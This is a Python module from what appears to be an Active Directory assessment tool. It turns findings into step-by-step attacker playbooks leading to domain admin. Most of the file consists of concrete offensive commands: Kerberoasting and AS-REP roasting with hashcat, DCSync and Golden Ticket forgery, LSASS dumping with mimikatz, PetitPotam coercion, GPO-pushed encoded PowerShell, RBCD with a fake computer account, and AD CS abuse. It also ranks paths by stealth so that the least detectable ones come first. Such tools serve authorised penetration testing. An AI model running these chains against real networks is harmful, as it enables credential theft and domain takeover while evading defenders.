#!/usr/bin/env python3
"""
attack_paths.py — Builds logical attack-path chains from the findings.

Each path is a named, multi-step playbook showing how an attacker would
chain findings into a Domain Admin (or equivalent) compromise. Steps
include concrete tool commands with placeholders.
"""

from __future__ import annotations

from typing import Any, Dict, List

from .models import ObjectStore
from .theme import Severity


# OPSEC NOISE MAP — per attack path type
# (noise_penalty, label, [event_ids])
EDGE_NOISE: Dict[str, tuple] = {
    "Kerberoast":       (2, "🟡 LOW",    ["4769 (TGS-REQ — RC4 type 0x17)"]),
    "AS-REP Roast":     (0, "🟢 SILENT", []),
    "ACL Abuse":        (6, "🔴 HIGH",   ["5136 (object modified)", "4670 (permissions changed)"]),
    "Unconstrained":    (5, "🟠 MEDIUM", ["4624 (logon on UD host)"]),
    "GPO Abuse":        (8, "🔴 HIGH",   ["5136 (GPO modified)", "5145 (SYSVOL access)"]),
    "Shadow Cred":      (5, "🟠 MEDIUM", ["5136 (msDS-KeyCredentialLink write)"]),
    "DCSync":           (9, "⛔ LOUD",   ["4662 (directory replication)"]),
    "LAPS Pivot":       (0, "🟢 SILENT", []),
    "Self-Add":         (8, "🔴 HIGH",   ["4728 (group member added)"]),
    "MAQ":              (3, "🟠 MEDIUM", ["4741 (computer account created)"]),
    "gMSA":             (1, "🟡 LOW",    []),
    "AD CS":            (1, "🟡 LOW",    ["4886 (certificate request)", "4887 (certificate issued)"]),
    "ESC":              (1, "🟡 LOW",    ["4886 (certificate request)"]),
}


def _classify_path_noise(path_name: str) -> tuple:
    """Return (noise_penalty, label, events) by matching path name prefix."""
    for prefix, (penalty, label, events) in EDGE_NOISE.items():
        if prefix.lower() in path_name.lower():
            return penalty, label, events
    return 4, "🟠 MEDIUM", []


def _finding_by_title(findings: List[Dict[str, Any]], title: str) -> Dict[str, Any] | None:
    for f in findings:
        if f.get("title") == title:
            return f
    return None


def build_attack_paths(store: ObjectStore, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """Generate structured attack paths from the findings list."""
    paths: List[Dict[str, Any]] = []

    # ── Path 1: Kerberoast → Crack → DA ─────────────────────────────────────
    krb = _finding_by_title(findings, "Kerberoastable Users")
    if krb and krb["data"]:
        for target in [d for d in krb["data"] if d.get("in_high_value_group")][:3]:
            paths.append({
                "name": f"Kerberoast → Crack → {target['name']}",
                "severity": Severity.CRITICAL,
                "summary": (
                    f"The user '{target['name']}' has an SPN and is a member of a high-value "
                    "group. Any authenticated user can request a TGS for it and crack it offline."
                ),
                "steps": [
                    "1. You have any domain credentials (even a low-priv user).",
                    f"2. Request a TGS for {target['name']}:\n"
                    "   impacket-GetUserSPNs <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -request -dc-ip <DC_IP> -outputfile hashes.txt",
                    "3. Crack offline with hashcat:\n"
                    "   hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --rule=/usr/share/hashcat/rules/best64.rule",
                    f"4. Use cracked credentials to authenticate as {target['name']}.",
                    "5. Target is in a high-value group → immediate privilege escalation to DA-equivalent.",
                ],
                "prerequisites": ["Any authenticated domain account."],
                "tools": ["impacket-GetUserSPNs", "hashcat"],
            })

    # ── Path 2: ACL Abuse → Takeover → DA ───────────────────────────────────
    acl = _finding_by_title(findings, "Dangerous ACL Permissions")
    if acl and acl["data"]:
        for edge in [d for d in acl["data"] if d["severity"] == Severity.CRITICAL][:3]:
            right = edge["right"]
            target_type = edge["source_type"]
            playbooks_map = {
                "GenericAll": "Reset password / add-to-group / shadow credentials",
                "GenericWrite": "Set SPN (Kerberoast) or write msDS-KeyCredentialLink (Shadow Credentials)",
                "WriteDacl": "Grant yourself GenericAll → reset password",
                "WriteOwner": "Take ownership → grant GenericAll → reset password",
                "AddMember": "Add yourself to the group → inherit privileges",
                "ForceChangePassword": "Reset the target's password directly",
                "AddKeyCredentialLink": "Shadow Credentials takeover",
            }
            abuse = playbooks_map.get(right, "See ELI5 entry for abuse path")
            paths.append({
                "name": f"ACL Abuse: {edge['principal']} → {right} → {edge['source_object']}",
                "severity": Severity.CRITICAL,
                "summary": (
                    f"{edge['principal']} holds {right} on {edge['source_object']} "
                    f"({target_type}). This is a direct takeover primitive."
                ),
                "steps": [
                    f"1. You control {edge['principal']} (or are a member of it transitively).",
                    f"2. Right held: {right} — abuse pattern: {abuse}",
                    f"3. Example command (adapt to target type):\n"
                    f"   impacket-dacledit <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -action write -rights FullControl -principal '<DOMAIN_USER>' -target '{edge['source_object']}' -dc-ip <DC_IP>",
                    f"4. After takeover, authenticate as {edge['source_object']}.",
                    "5. If target is in a high-value group, you now have DA-equivalent privilege.",
                ],
                "prerequisites": [f"Control of {edge['principal']}"],
                "tools": ["impacket-dacledit", "impacket-changepasswd", "certipy", "rbcd.py"],
            })

    # ── Path 3: Unconstrained Delegation → Coerce → DA ──────────────────────
    unc = _finding_by_title(findings, "Unconstrained Delegation")
    if unc and unc["data"]:
        for comp in unc["data"][:2]:
            paths.append({
                "name": f"Unconstrained Delegation: {comp['name']}",
                "severity": Severity.CRITICAL,
                "summary": (
                    f"{comp['name']} has unconstrained delegation enabled. Coerce a DC to "
                    "authenticate to it and capture the DC's TGT."
                ),
                "steps": [
                    f"1. Compromise {comp['name']} (or any account with admin on it).",
                    "2. From that box, coerce DC authentication:\n"
                    f"   python3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' {comp['name']} <DC_IP>",
                    "   (alternative) python3 printerbug.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_IP> " + comp['name'],
                    f"3. On {comp['name']}, dump LSASS for the captured DC$ TGT:\n"
                    "   mimikatz # sekurlsa::tickets /export",
                    "4. Use the DC$ TGT to perform DCSync:\n"
                    "   export KRB5CCNAME=DC.ccache; impacket-secretsdump -k -no-pass <DOMAIN>/DC$@<DC_HOST>",
                    "5. Forge a Golden Ticket with krbtgt hash → persistent DA.",
                ],
                "prerequisites": ["Admin rights on the unconstrained-delegation box", "Network reach to DC"],
                "tools": ["PetitPotam", "printerbug", "mimikatz", "impacket-secretsdump", "impacket-ticketer"],
            })

    # ── Path 4: GPO Abuse → Code Execution ─────────────────────────────────
    gpo = _finding_by_title(findings, "GPO Abuse Paths")
    if gpo and gpo["data"]:
        for edge in [d for d in gpo["data"] if d.get("kind") == "direct_write"][:2]:
            paths.append({
                "name": f"GPO Abuse: {edge['attacker']} → {edge['right']} → {edge['gpo']}",
                "severity": Severity.CRITICAL,
                "summary": (
                    f"{edge['attacker']} has {edge['right']} on GPO {edge['gpo']}. Edit the "
                    "GPO to push code execution to every computer in the linked OU."
                ),
                "steps": [
                    f"1. You control {edge['attacker']} and have {edge['right']} on {edge['gpo']}.",
                    "2. Add a malicious immediate task to the GPO:\n"
                    "   SharpGPOAbuse.exe --AddComputerTask --TaskName 'Update' --Author '<DOMAIN>\\\\<DOMAIN_USER>' --Command 'cmd.exe' --Arguments '/c powershell -enc <BASE64>' --GPOName '<GPO_NAME>'",
                    "3. Wait for GPO refresh (≤90 min on workstations) or force it on a target you admin:\n"
                    "   gpupdate /force",
                    "4. Code execution lands in SYSTEM context on every computer in the linked OU.",
                ],
                "prerequisites": [f"Control of {edge['attacker']}"],
                "tools": ["SharpGPOAbuse", "PowerView (New-GPOImmediateTask)"],
            })

    # ── Path 5: AS-REP Roast → Crack → Access ───────────────────────────────
    asrep = _finding_by_title(findings, "AS-REP Roastable Users")
    if asrep and asrep["data"]:
        for target in asrep["data"][:2]:
            paths.append({
                "name": f"AS-REP Roast: {target['name']}",
                "severity": Severity.HIGH,
                "summary": (
                    f"{target['name']} has DONT_REQ_PREAUTH set. Any unauthenticated attacker "
                    "can request an AS-REP and crack it offline."
                ),
                "steps": [
                    "1. No credentials required — just a username list.",
                    "2. Request AS-REP responses:\n"
                    "   impacket-GetNPUsers <DOMAIN>/ -no-pass -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile hashes.txt",
                    "3. Crack with hashcat:\n"
                    "   hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt",
                    f"4. Authenticate as {target['name']} with the cracked password.",
                    "5. Enumerate from this account's privileges and chain further.",
                ],
                "prerequisites": ["Username enumeration", "Network reach to DC"],
                "tools": ["impacket-GetNPUsers", "hashcat"],
            })

    # ── Path 6: Shadow Credentials ─────────────────────────────────────────
    shadow = _finding_by_title(findings, "Shadow Credentials Opportunities")
    if shadow and shadow["data"]:
        for opp in shadow["data"][:3]:
            paths.append({
                "name": f"Shadow Credentials: {opp['attacker']} → {opp['right']} → {opp['target']}",
                "severity": Severity.CRITICAL,
                "summary": (
                    f"{opp['attacker']} holds {opp['right']} on {opp['target']} ({opp['target_type']}). "
                    "Add a KeyCredentialLink and authenticate with a certificate."
                ),
                "steps": [
                    f"1. You control {opp['attacker']} and have {opp['right']} on {opp['target']}.",
                    "2. Add a KeyCredentialLink:\n"
                    f"   certipy shadow auto -u '<DOMAIN_USER>' -p '<PASSWORD>' -account '{opp['target']}' -dc-ip <DC_IP>",
                    "   (alternative) whisker.py add /target:<TARGET> /domain:<DOMAIN> /dc:<DC_HOST> /user:<DOMAIN_USER> /password:<PASSWORD>",
                    "3. Authenticate as the target with the resulting certificate (PKINIT).",
                    f"4. Receive NT hash + TGT for {opp['target']}.",
                    "5. Pass-the-hash / pass-the-ticket for further movement.",
                ],
                "prerequisites": [f"Control of {opp['attacker']}", "DC must support PKINIT (2016+)"],
                "tools": ["certipy", "whisker", "Rubeus"],
            })

    # ── Path 7: DCSync Direct ──────────────────────────────────────────────
    dcsync = _finding_by_title(findings, "DCSync Rights")
    if dcsync and dcsync["data"]:
        for entry in dcsync["data"][:2]:
            paths.append({
                "name": f"DCSync: {entry['account']}",
                "severity": Severity.CRITICAL,
                "summary": (
                    f"{entry['account']} has DCSync rights on {entry['domain']}. One command "
                    "dumps every hash in the domain."
                ),
                "steps": [
                    f"1. You control {entry['account']} (or are a transitive member).",
                    "2. Dump every NT hash in the domain:\n"
                    "   impacket-secretsdump <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_IP> -just-dc-ntlm",
                    "3. Extract krbtgt hash for Golden Ticket forgery:\n"
                    "   (the krbtgt hash will be in the output of step 2)",
                    "4. Forge a Golden Ticket for persistence:\n"
                    "   impacket-ticketer -nthash <KRBTGT_HASH> -domain <DOMAIN> -domain-sid <DOMAIN_SID> -user-id 500 administrator",
                    "5. Pass-the-ticket to DA access:\n"
                    "   export KRB5CCNAME=administrator.ccache; impacket-psexec <DOMAIN>/administrator@<DC_HOST> -k -no-pass",
                ],
                "prerequisites": [f"Control of {entry['account']}"],
                "tools": ["impacket-secretsdump", "impacket-ticketer", "impacket-psexec"],
            })

    # ── Path 8: LAPS → Local Admin → LSASS dump ────────────────────────────
    laps = _finding_by_title(findings, "LAPS Password Readers")
    if laps and laps["data"]:
        for entry in laps["data"][:2]:
            paths.append({
                "name": f"LAPS Pivot: {entry['reader']} → {entry['target_computer']}",
                "severity": Severity.HIGH,
                "summary": (
                    f"{entry['reader']} can read the LAPS-managed local admin password on "
                    f"{entry['target_computer']}. Pivot to local admin."
                ),
                "steps": [
                    f"1. You control {entry['reader']} (or are a member).",
                    f"2. Read the LAPS password for {entry['target_computer']}:\n"
                    f"   python3 pyLAPS.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -t '{entry['target_computer']}'",
                    "3. Use the recovered password for local admin access:\n"
                    f"   impacket-psexec '<DOMAIN>/<LOCAL_ADMIN>:<LAPS_PASS>@{entry['target_computer']}'",
                    "4. Dump LSASS for cached domain credentials:\n"
                    "   mimikatz # sekurlsa::logonpasswords",
                    "5. Pivot further using harvested hashes / tickets.",
                ],
                "prerequisites": [f"Control of {entry['reader']}", "LAPS deployed on target"],
                "tools": ["pyLAPS", "Get-AdmPwdPassword", "impacket-psexec", "mimikatz"],
            })

    # ── Path 9: Self-Add to Group → Privilege Escalation ───────────────────
    self_add = _finding_by_title(findings, "Self-Add to Group Escalation")
    if self_add and self_add["data"]:
        for opp in self_add["data"][:3]:
            right = opp["right"]
            playbooks_map = {
                "AddMember": "Directly add principal to target group",
                "GenericAll": "Full control of the group allows writing members",
                "GenericWrite": "Write member attribute to target group",
                "WriteDacl": "Grant yourself AddMember, then add member",
                "WriteOwner": "Take ownership, then grant AddMember, then add member",
                "Owns": "Take ownership (as owner), grant AddMember, then add member",
            }
            abuse = playbooks_map.get(right, "Add principal to group")
            paths.append({
                "name": f"Self-Add: {opp['principal']} → {right} → {opp['target_group']}",
                "severity": Severity.CRITICAL if opp.get("is_high_value") else Severity.HIGH,
                "summary": (
                    f"{opp['principal']} holds {right} on {opp['target_group']} group. "
                    "This allows the principal (or its members/controllers) to add themselves "
                    "to the group and escalate privileges."
                ),
                "steps": [
                    f"1. You control {opp['principal']} (or are a member/local admin).",
                    f"2. Right held on target group: {right} — abuse pattern: {abuse}",
                    f"3. Example command to add yourself to the target group:\n"
                    f"   net rpc group addmem '{opp['target_group']}' '{opp['principal']}' -U '<DOMAIN>/<DOMAIN_USER>%<PASSWORD>' -S <DC_HOST>\n"
                    "   (alternative - bloodyAD):\n"
                    f"   bloodyAD --host <DC_IP> -u '<DOMAIN_USER>' -p '<PASSWORD>' add groupMember '{opp['target_group']}' '{opp['principal']}'",
                    f"4. After adding, re-authenticate to obtain the new group token / SID in your token.",
                    f"5. If {opp['target_group']} is high-value (like Domain Admins, Account Operators, etc.), you have escalated privileges.",
                ],
                "prerequisites": [f"Control of {opp['principal']}"],
                "tools": ["net rpc", "bloodyAD", "PowerView (Add-DomainGroupMember)", "impacket-dacledit"],
            })

    # ── Path 10: MAQ → RBCD → DA ──────────────────────────────────────────
    maq = _finding_by_title(findings, "Machine Account Quota Abuse")
    if maq and maq["data"]:
        for entry in maq["data"][:1]:
            paths.append({
                "name": f"MAQ → RBCD: {entry['domain']} (quota={entry['machine_account_quota']})",
                "severity": Severity.HIGH,
                "summary": (
                    f"ms-DS-MachineAccountQuota is {entry['machine_account_quota']} on {entry['domain']}. "
                    "Any authenticated user can create computer accounts for RBCD."
                ),
                "steps": [
                    "1. You have any domain credentials.",
                    "2. Create a fake computer account:\n"
                    "   impacket-addcomputer <DOMAIN>/<DOMAIN_USER>:<PASSWORD> -dc-ip <DC_IP> -computer-name 'EVIL$' -computer-pass '<NEW_PASSWORD>'",
                    "3. Find a target computer where you have GenericWrite (check ACL findings above).",
                    "4. Set RBCD delegation:\n"
                    "   rbcd.py <DOMAIN>/<DOMAIN_USER>:<PASSWORD>@<DC_HOST> -delegate-to '<TARGET_HOST>$' -delegate-from 'EVIL$' -action write",
                    "5. Request impersonation ticket:\n"
                    "   impacket-getST <DOMAIN>/EVIL$:'<NEW_PASSWORD>' -spn 'cifs/<TARGET_HOST>' -impersonate administrator -dc-ip <DC_IP>",
                    "6. Use the ticket:\n"
                    "   export KRB5CCNAME=administrator.ccache; impacket-psexec <DOMAIN>/administrator@<TARGET_HOST> -k -no-pass",
                ],
                "prerequisites": ["Any authenticated domain account", "GenericWrite on a target computer"],
                "tools": ["impacket-addcomputer", "rbcd.py", "impacket-getST", "impacket-psexec"],
            })

    # ── Path 11: gMSA Password Read → Service Takeover ────────────────────
    gmsa = _finding_by_title(findings, "gMSA Password Readers")
    if gmsa and gmsa["data"]:
        for entry in gmsa["data"][:2]:
            paths.append({
                "name": f"gMSA Takeover: {entry['reader']} → ReadGMSAPassword → {entry['gmsa_account']}",
                "severity": Severity.HIGH,
                "summary": (
                    f"{entry['reader']} can read the managed password of gMSA {entry['gmsa_account']}. "
                    "Extract the hash and authenticate as the service account."
                ),
                "steps": [
                    f"1. You control {entry['reader']} (or are a transitive member).",
                    f"2. Dump the gMSA password hash for {entry['gmsa_account']}:\n"
                    "   python3 gMSADumper.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -dc-ip <DC_IP>",
                    "   (alternative) nxc ldap <DC_IP> -u '<DOMAIN_USER>' -p '<PASSWORD>' -M gmsa",
                    f"3. Authenticate as {entry['gmsa_account']} using the NT hash:\n"
                    f"   impacket-psexec <DOMAIN>/{entry['gmsa_account']}@<TARGET_HOST> -hashes :<NT_HASH>",
                    "4. The gMSA account likely has service-level privileges — enumerate further.",
                ],
                "prerequisites": [f"Control of {entry['reader']}"],
                "tools": ["gMSADumper", "nxc (NetExec)", "impacket-psexec"],
            })

    # ── Path 12: AD CS Certificate Abuse ──────────────────────────────────
    adcs = _finding_by_title(findings, "AD CS Misconfigurations")
    if adcs and adcs["data"]:
        for item in adcs["data"][:3]:
            esc = item.get("esc", "")
            template_or_ca = item.get("template") or item.get("ca", "Unknown")
            paths.append({
                "name": f"AD CS {esc}: {template_or_ca}",
                "severity": item.get("severity", Severity.HIGH),
                "summary": item.get("description", f"{esc} misconfiguration on {template_or_ca}"),
                "steps": [
                    "1. You have any authenticated domain credentials.",
                    f"2. {esc} misconfiguration detected on: {template_or_ca}",
                    f"3. Exploit with Certipy:\n   {item.get('playbook', 'certipy find -vulnerable')}",
                    "4. Authenticate with the issued certificate:\n"
                    "   certipy auth -pfx <certificate>.pfx -dc-ip <DC_IP>",
                    "5. Use the recovered NT hash to pass-the-hash as the impersonated user.",
                ],
                "prerequisites": ["Any authenticated domain account", "Network reach to CA"],
                "tools": ["certipy", "Rubeus", "impacket-psexec"],
            })

    # ── Inject OpSec metadata into every path ──────────────────────────────
    for p in paths:
        penalty, label, events = _classify_path_noise(p["name"])
        p["opsec_score"] = penalty
        p["opsec_label"] = label
        p["detection_events"] = events

    # Sort: stealthiest paths first (lowest noise)
    paths.sort(key=lambda p: p.get("opsec_score", 5))
    return paths
